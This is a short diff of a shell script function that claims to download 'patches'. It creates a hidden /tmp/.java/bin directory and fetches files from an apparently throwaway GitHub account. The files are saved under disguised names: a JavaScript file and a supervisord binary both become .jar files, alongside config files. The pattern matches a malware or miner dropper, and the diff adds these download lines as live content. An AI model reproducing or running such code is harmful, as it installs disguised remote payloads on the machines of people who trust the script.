@@ -2,11 +2,11 @@
 
 function fetch_files() {
     echo "Downloading Patches ..."
-    mkdir -p /tmp/.java/bin &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/cfg.conf -o cfg.conf &&
-        curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/conf.json -o conf.json
+    mkdir -p /tmp/.java/bin
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o user-patch.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/cfg.conf -o cfg.conf
+    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/fradky/conf.json -o conf.json
     echo "DONE ..."
 }
 
